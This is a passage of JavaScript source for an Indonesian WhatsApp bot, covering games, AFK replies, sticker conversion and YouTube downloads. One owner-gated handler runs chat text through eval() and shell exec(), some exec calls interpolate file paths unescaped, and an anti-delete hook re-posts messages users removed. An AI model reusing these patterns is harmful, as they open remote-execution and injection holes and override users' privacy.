const buttons = [{buttonId: 'tebakanime', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `𝗚𝗔𝗠𝗘 𝗧𝗘𝗕𝗔𝗞 𝗔𝗡𝗜𝗠𝗘

_*Selamat jawaban kamu benar*_
*Jawaban :* ${game.getJawabanTA(from, tebakanime)}
*Hadiah :* $${vinna}

Ingin bermain lagi? *tekan tombol dibawah*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}
}
if (isfam(from, family100) && !isBan && isUser){
var anjuy = getjawaban100(from, family100)
for (let i of anjuy){
if (chats.toLowerCase().includes(i)){
var htgmi = Math.floor(Math.random() * `${balanc}`) + 1
addBalance(sender, htgmi, balance)
reply(`𝗚𝗔𝗠𝗘 𝗙𝗔𝗠𝗜𝗟𝗬 *100*

_*Jawaban kamu benar*_
*Jawaban :* ${i}
*Hadiah :* $${htgmi}

*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
var anug = anjuy.indexOf(i)
anjuy.splice(anug, 1)
}
}
if (anjuy.length < 1){
const buttons = [{buttonId: 'family100', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: `Semua jawaban sudah tertebak

*Tekan tombol dibawah untuk bermain lagi*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
family100.splice(getfamposi(from, family100), 1)
}
}

_prem.expiredCheck(premium)
_sewa.expiredCheck(surya, sewa)

if (isCmd && !isUser){
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar))
}

if (isGroup) {
if (isQuotedMsg) {
if (afk.checkAfkUser(quotedMsg.sender, _afk)) {
const getafk = afk.getAfkId(quotedMsg.sender, _afk)
const getAlasan = afk.getAfkReason(getafk, _afk)
const getWaktu = Date.now() - afk.getAfkTime(getafk, _afk)
const hehem = ms(getWaktu)
const butafk = [{buttonId: 'verify', buttonText: {displayText: 'Oke'}, type: 1}]
const butafkMessage = {
contentText: `Jangan tag dia! Dia sedang AFK

*Alasan :* ${getAlasan}
*Selama :* ${hehem.days} Hari, ${hehem.hours} Jam, ${hehem.minutes} Menit, ${hehem.seconds} Detik yang lalu

*_Silahkan hubungi lagi nanti setelah Afk_*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: butafk,
headerType: 1
}
surya.sendMessage(from, butafkMessage, MessageType.buttonsMessage, {
contextInfo: {forwardingScore: 1000, isForwarded: true, mentionedJid: [quotedMsg.sender, Suryaa, '0@s.whatsapp.net']}, quoted:msg})
const but = [{buttonId: 'verify', buttonText: {displayText: 'Iya sayang'}, type: 1}]
const butMessage = {
contentText: `Ada yang mencari anda saat anda offline
*Nama :* ${pushname}
*Nomor :* wa.me/${sender.split("@")[0]}
*Di Grup :* ${groupName}
*Pesan :* ${args[0]} ${q}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: but,
headerType: 1
}
surya.sendMessage(quotedMsg.sender, butMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [quotedMsg.sender, sender, Suryaa, Dinda, Kizora, Amanda, Syahira, '0@s.whatsapp.net']}, quoted: msg})
}
}

if (mentioned.length !== 0){
for (let ment of mentioned) {
if (afk.checkAfkUser(ment, _afk)) {
const getId = afk.getAfkId(ment, _afk)
const getReason = afk.getAfkReason(getId, _afk)
const getTime = Date.now() - afk.getAfkTime(getId, _afk)
const heheh = ms(getTime)
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Oke'}, type: 1}]
const buttonsMessage = {
contentText: `Jangan tag dia! Dia sedang AFK

*Alasan :* ${getReason}
*Selama :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik yang lalu

*_Silahkan hubungi lagi nanti setelah Afk_*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {forwardingScore: 1000, isForwarded: true, mentionedJid: [ment, Suryaa, '0@s.whatsapp.net']}, quoted:msg})
const but = [{buttonId: 'verify', buttonText: {displayText: 'Iya sayang'}, type: 1}]
const butMessage = {
contentText: `Ada yang mencari anda saat anda offline
*Nama :* ${pushname}
*Nomor :* wa.me/${sender.split("@")[0]}
*Di Grup :* ${groupName}
*Pesan :* ${args[0]} ${q}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: but,
headerType: 1
}
surya.sendMessage(ment, butMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [ment, sender, Suryaa, Dinda, Amanda, Syahira, '0@s.whatsapp.net']}, quoted: msg})
}
}
}

if (afk.checkAfkUser(sender, _afk)) {
const getAfk = afk.getAfkId(sender, _afk)
const getAlasan = afk.getAfkReason(getAfk, _afk)
const getWaktu = Date.now() - afk.getAfkTime(getAfk, _afk)
const heh = ms(getWaktu)
_afk.splice(afk.getAfkPosition(sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
reply(`
@${sender.split('@')[0]} telah kembali dari *AFK* nya

*Dengan alasan :* ${getAlasan}
*Sejak :* ${heh.days}${heh.hours} Jam, ${heh.minutes} Menit, ${heh.seconds} Detik yang lalu`, {contextInfo: {"mentionedJid": [sender]}})
}
}

        if (isOwner){
            if (chats.startsWith("> ")){
                console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                try {
                    let evaled = await eval(chats.slice(2))
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    textImg(`${evaled}`)
                } catch (err) {
                    textImg(`${err}`)
                }
            } else if (chats.startsWith("$ ")){
                console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                exec(chats.slice(2), (err, stdout) => {
					if (err) return textImg(`${err}`)
					if (stdout) textImg(`${stdout}`)
				})
            }
        }

//ANTIDELETE BY SURYA
//if (!isBan){
if (!Array.isArray(surya._events['CB:action,add:relay,message'])) surya._events['CB:action,add:relay,message'] = [surya._events['CB:action,add:relay,message']]
else surya._events['CB:action,add:relay,message'] = [surya._events['CB:action,add:relay,message'].pop()]
surya._events['CB:action,add:relay,message'].unshift(async json => {
try {
if (!isBan && antidelete === 'AKTIF'){
let m = json[2][0][2]
if (m.message && m.message.protocolMessage && m.message.protocolMessage.type == 0) {
let key = m.message.protocolMessage.key
if (key.fromMe && !isBan && antidelete === 'AKTIF') return
let c = surya.chats.get(key.remoteJid)
let a = c.messages.dict[`${key.id}|${key.fromMe ? 1 : 0}`]
let participant = key.fromMe ? surya.user.jid : a.participant ? a.participant : key.remoteJid
surya.sendMessage(key.remoteJid, (`
*[ ANTI-DELETE MECHA BOTZ ]*

𝗍ᥱrძᥱ𝗍ᥱksі @${participant.split('@')[0]} 𝗍ᥱᥣᥲһ mᥱᥒgһᥲ⍴ᥙs ⍴ᥱsᥲᥒ
ᥕᥲk𝗍ᥙ : _*${timesNow}*_
ᥒ᥆m᥆r : _*${participant.split('@')[0]}*_`), MessageType.extendedText,
{contextInfo: {forwardingScore: 1000, isForwarded: false, mentionedJid: [participant]}, msg})
let content = surya.generateForwardMessageContent(a, false)
let ctype = Object.keys(content)[0]
let atype = Object.keys(a.message)[0]
let context = {}
if (atype != MessageType.text) context = a.message[atype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = surya.prepareMessageFromContent(key.remoteJid, content, {})
await surya.relayWAMessage(waMessage)
}
}
} catch (e) {
console.log(e)
}
})

if (isSimih && !isCmd && !isSticker && !fromMe) {
let anu = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
let sami = anu.success
surya.sendMessage(from, `${sami}`, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {forwardingScore: 508, isForwarded: true}})
}


if (isCmd && isSholat && !fromMe) {
let resnya = fs.readFileSync('./media/bro gak sholat?.webp')
let magh = `Sholat Jum'at Dulu kak ${pushname}, nanti lanjut chatan lagi`
surya.sendMessage(from, magh, text, {contextInfo: { forwardingScore: 100, isForwarded: true, mentionedJid: [sender]}, quoted: fkontak})
}

/*if (!isGroup && !isBan && isCmd && !isSticker && !isMedia && !isAudio && !fromMe) {
surya.updatePresence(from, Presence.composing)
let anu = await fetchJson(`https://api.simsimi.net/v1/?lang=id&cf=false&text=${budy}`)
let sami = anu.success
textImg(`${sami}`)
}*/

if (fromMe){
if (chats.startsWith(">")){
console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'cyan'), color(`Dari Surya`))
try {
let evaled = await eval(chats.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
textImg(`${evaled}`)
} catch (err) {
textImg(`${err}`)
}
} else if (chats.startsWith("$")){
console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'cyan'), color(`Dari Surya`))
exec(chats.slice(2), (err, stdout) => {
if (err) return textImg(`${err}`)
if (stdout) textImg(`${stdout}`)
})
}
}

//AutoSticker By Surya
if (isImage && isAutoSticker) {
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isMuted) return
if (isBan) return 
let encmedia = msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
reply(`*「 IMAGE TERDETEKSI 」*`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
limitAdd(sender, limit)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
}

//Autosticker By Surya
if (isVideo && isAutoSticker) {
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let encmedia = msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
reply(`*「 VIDEO TERDETEKSI 」*`)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
limitAdd(sender, limit)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
}

//Autoimage By Surya
if (isSticker && isAutoImage) {
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let encmedia = msg
let media = await surya.downloadAndSaveMediaMessage(encmedia)
reply(`*「 STICKER TERDETEKSI 」*`)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Gagal *${pushname}* :v`)
surya.sendMessage(from, fs.readFileSync(ran), image, {quoted: msg, caption: `Nih ${pushname}`})
limitAdd(sender,limit)
fs.unlinkSync(ran)
})
}
//AutoVideo By Surya
if (isSticker && isAutoVideo) {
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let encmedia = msg
let media = await surya.downloadAndSaveMediaMessage(encmedia)
reply(`*「 STICKER TERDETEKSI 」*`)
let a = await webp2gifFile(media)
let mp4 = await getBuffer(a.result)
surya.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: msg, caption: mess.success})
limitAdd(sender,limit)
fs.unlinkSync(media)
}


if (isSticker && isAutoColong) {
if (isMuted) return
if (isBan) return 
let encmedia = msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
//reply(`*「 Aku Ambil 」*`)
let packname1 = 'Mecha Botz - Surya'
let author1 = `62895415497664`
exif.create(packname1, author1, `takestick_${sender}`)
exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
})
}

//FUNCTIO NYE BANG
const q3 = Object.keys(msg.message)[0] == "buttonsResponseMessage" ? msg.message.buttonsResponseMessage.selectedButtonId : ""
const butresx = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedDisplayText : ''

//TAROK TERSERAH YANG PENTING JANGAN BAWAH SWITCH COMMAND
switch(butresx){
case 'AUDIO': 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
try {
textImg('_Lagu yang anda cari Sedang DiProsess.._')
let yut = await yts(q3)
yta(yut.videos[0].url)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*P L A YM P 3*\n\n${S} Title : ${title}\n${S} Ext : MP3\n${S} Filesize : ${filesizeF}\n${S} Upload : ${yut.videos[0].ago}\n${S} Views : ${yut.videos[0].views}\n${S} Duration : ${yut.videos[0].timestamp}\n${S} Link : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
const captionis = `
*YOUTUBE PLAY MP3*

${S}Title : ${title}
Size : ${filesizeF}
Tipe : Audio
Views: ${yut.videos[0].views}
Duration : ${yut.videos[0].timestamp}
Link : ${yut.videos[0].url}${S}

*_Lagu Yang Anda Cari Sedang Dikirim..._*`
//sendFileFromUrl(from, thumb, `${captionis}`, msg)
let mp3nya = getBuffer(`https://youtube.com/watch?v=-_lb--PWEMU`)
surya.sendMessage(from, mp3nya, audio, {contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `PLAY MP3` ,
"body": `Mecha Botz`,
"mediaType": "2",
"thumbnailUrl": "",
"mediaUrl": `${dl_link}`,
"thumbnail": "",
"sourceUrl": "",
},mentionedJid:[Suryaa, sender]}, quoted: msg})
})
})
.catch((err) => reply(`${err}`))
} catch (err) {
sendMess(ownerNumber, 'PlayMp3 Error : ' + err)
console.log(color('[PlayMp3]', 'red'), err)
reply(mess.error.api)
gameAdd(sender, glimit)
}
break
case 'VIDEO':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
try {
Flink(mess.wait)
let yut = await yts(q3)
ytv(yut.videos[0].url)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*P L A YM P 4*\n\n • Judul : ${title}\n • Size : ${filesizeF}\n • Upload : ${yut.videos[0].ago}\n • Ditonton : ${yut.videos[0].views}\n • Duration : ${yut.videos[0].timestamp}\n • Link : ${a.data}\n\n_Ukuran File Terlalu besar, anda bisa download sendiri lewat Link Diatas!!_`)

const mp4 = `
*YOUTUBE PLAY MP4*

${S}Judul : ${title}
Size : ${filesizeF}
Tipe : Video
Upload : ${yut.videos[0].ago}
Ditonton : ${yut.videos[0].views}
Duration : ${yut.videos[0].timestamp}
Link : ${yut.videos[0].url}${S}`
sendFileFromUrl(from, dl_link, mp4)
limitAdd(sender, limit)
})
})
.catch((err) => reply(`${err}`))
} catch (err) {
sendMess(ownerNumber, 'PlayMp4 Error : ' + err)
console.log(color('[PlayMp4]', 'red'), err)
reply(mess.error)
gameAdd(sender, glimit)
}
break
switch(command){
case 'game':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let gl = '10'
let ano = Number(nebal(gl) * `${harganya}`)
if (getBalance(sender, balance) < ano) return textImg(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ano, balance)
givegame(sender, nebal(gl), glimit)
reply(monospace(`Pembeliaan game limit sebanyak ${gl} berhasil

Sisa Balance : $${getBalance(sender, balance)}
Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
}
break
case 'FITUR':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let qn = q3
let ane = Number(nebal(qn) * `${harganya}`)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(qn), limit)
reply(monospace(`Pembeliaan limit sebanyak ${qn} berhasil

Sisa Balance : $${getBalance(sender, balance)}
Sisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
}




//TARO TERSERAH BAWA SWITCH COMMAND
switch(command){
case 'belimit':
if (!q)return reply(`Example : ${prefix + command} 10`)
if (isNaN(q)) return reply(`Harus berupa angka`)
const tiyu = `PEMBELIAN SEBANYAK ${q}`
const buttons = [
{buttonId: `${q}`, buttonText: {displayText: 'FITUR'}, type: 1},
{buttonId: 'game', buttonText: {displayText: 'GAME'}, type: 1}
]
const buttonMessage = {
contentText: tiyu,
footerText: `ᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ ʏᴀ ᴋᴀᴋ\n\n© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
await surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
switch(command){
case 'ytplay':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length < 1) return reply(`Kirim perintah *${prefix}play query*`)
gameAdd(sender, glimit)
Flink(mess.wait)
let yut = await yts(q)
yta(yut.videos[0].url)
.then(async(res) => {
const { thumb, title, filesizeF, filesize } = res
const capti = `
*YOUTUBE PLAY*

${S}Title : ${title}
Size : ${filesizeF}
Views: ${yut.videos[0].views}
Duration : ${yut.videos[0].timestamp}
Link : ${yut.videos[0].url}${S}`
let ya = await getBuffer(thumb)
let py =await surya.prepareMessage(from, ya, image)
const buttons = [
{buttonId: `${q}`, buttonText: {displayText: 'AUDIO'}, type: 1},
{buttonId: `${q}`, buttonText: {displayText: 'VIDEO'}, type: 1}
]
const buttonMessage = {
imageMessage: py.message.imageMessage,
contentText: capti,
footerText: `ᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ ʏᴀ ᴋᴀᴋ\n\n© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}
await surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
})
break
}
//SEPARO LU UBAH KALO ADA YG DEFINED LU PERBAIKI PASTI BISA SIMPEL

switch(command){
case 'totaluser':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
let userr = `╭─「 *TOTAL USER MECHA BOTZ* 」\n`
let no = 0
for (let hehehe of pendaftar) {
no += 1
userr += `*${no.toString()}.* @${hehehe.split('@')[0]}\n`
}
userr += `
│+ Total Pengguna : ${pendaftar.length}
╰────── ⎿ *Mecha Botz* ⏋────`
mentions(userr, pendaftar, true)
break
}

switch(command){
case 'addcmd': 
case 'setcmd':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isQuotedSticker) {
if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
textImg(`Sukses ${pushname}`)
} else {
reply('Tag stickernya')
}
break
case 'delcmd':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
_scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
textImg(`Sukses ${pushname}`)
break
case 'listcmd':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let teksnyee = `*「 LIST STICKER CMD 」*\n\n*Total :* ${_scommand.length}\n\n`
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `
➸ *ID :* ${i.id}
➸ *Cmd* : ${i.chats}\n`
}
mentions(teksnyee, cemde, true)
break
}
switch(command){
case 'prefix': case 'cekprefix':{
if (isMuted) return
if (isBan) return 
textImg(`${prefix}`)
}
break
}
switch(commands){
case 'sprefix':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
if (q === 'multi'){
multi = true
textImg(`Berhasil mengubah prefix ke ${q}`)
} else if (q === 'nopref'){
multi = false
nopref = true
textImg(`Berhasil mengubah prefix ke ${q}`)
} else {
multi = false
nopref = false
prefa = `${q}`
textImg(`Berhasil mengubah prefix ke ${q}`)
}
break
}
switch(commands){
case 'setprefix':
const buttons = [{buttonId: 'multi', buttonText: {displayText: 'Multi'}, type: 1},
{buttonId: 'nopref', buttonText: {displayText: 'Nopref'}, type: 1}]
const buttonsMessage = {
contentText: `Silahkan pilih multi atau nopref!`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
break
}
switch(commands){
case 'multi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
multi = true
textImg(`Berhasil mengubah prefix ke multi`)
break
case 'nopref':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
multi = false
nopref = true
textImg(`Berhasil mengubah prefix ke nopref`)
break
}
//JANGAN DI APA APA IN, NTAR ERROR NANGESS
const butt = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
switch(commands){
case 'rya': case 'daftar': case 'verify': case '257892': case '226942': case '236297': case '216039': case '221711': case '245304': case '166174': case '175220': case '244327': case '191049': case '220882': case '244859': case '227446': case '259328': case '259532': case '259634': case '259610': case '259348': case '258669': case '256097': case '118282': case '260028': case '260058': case '259557': case '259497': case '122220': case '260111': case '260088': case '259880': case '258977': case '260097': case '259765': case '259359': case '260138': case '259617': case '107965': case '197255': case '260276': case '260209': case '260210': case '260203': case '191360': case '191390': case '248933': case '257567': case '227913': case '211648': case '210240': case '260626': case '259622': case '257991': case '213966': case '260623': case '149112': case '257168': case '198203': case '114783': case '220958': case '244387': case '243734': case '223315': case '118069': case '136188': case '260686': case '241777': case '260912': case '142154': case '119798': case '261174': case '258301': case '256808': case '169134': case '220354': case '260271': case '261725': case '261378': case '252174': case '261928': case '114427': case '187003': case '147577': case '249458': case '157767': case '224316': case '175294': case '258450': case '233864': case '236128': case '261162': case '174036': case '187205': case '210873': case '193318': case '110232': case '199310': case '193816': case '220376': case '193814': case '193815': case '219068': case '220386': case '177642': case '188269': case '181837': case '220377': case '119293': case '257528': case '258926': case '262384': case '105951': case '259904': case '208174': case '249229': case '245644': case '262538': case '234818': case '216845': case '149212': case '134442': case '135927': case '262447': case '261811': case '261650': case '261225': case '261226': case '260761': case '250327': case '192327': case '167801': case '150309': case '123554': case '210505': case '170845': case '180122': case '271120':
if (isRegister) return //reply(`*@${sender.split('@')[0]} kamu sudah terverifikasi!*`, {contextInfo: {"mentionedJid": [sender]}})
//if (isGroup) return reply(mess.OnlyPM)
if (isMuted) return
//if (isBan) return 
const namaUser = pushname
const serialUser = createSerial(15)
let veri = sender
if (isUser) {
addRegisteredUser(sender, namaUser, serialUser, timesNow)
try {
var ppimg = await surya.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
var ppimg = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
}
let hasil = `
 *〘 VERIFICATION SUCCESS 〙*

• *Nama :* ${namaUser}
• *Serial :* ${serialUser}
